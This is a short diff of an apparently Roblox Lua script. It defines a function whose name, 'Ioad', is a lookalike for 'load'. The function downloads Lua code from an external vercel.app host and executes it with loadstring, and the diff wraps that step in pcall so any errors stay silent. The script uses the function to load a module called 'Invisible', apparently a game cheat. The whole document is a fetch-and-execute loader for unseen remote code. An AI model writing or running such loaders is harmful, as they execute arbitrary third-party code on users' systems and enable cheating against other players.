@@ -1,5 +1,10 @@
 function Ioad(name)
-    loadstring(game:HttpGet("https://ndraawzz-developer.vercel.app/auth.lua?" .. name))()
+    local baseUrl = "https://ndraawzz-developer.vercel.app/"
+    
+    pcall(function()
+        local response = game:HttpGet(baseUrl .. name)
+        loadstring(response)()
+    end)
 end
 
 Ioad("Invisible")
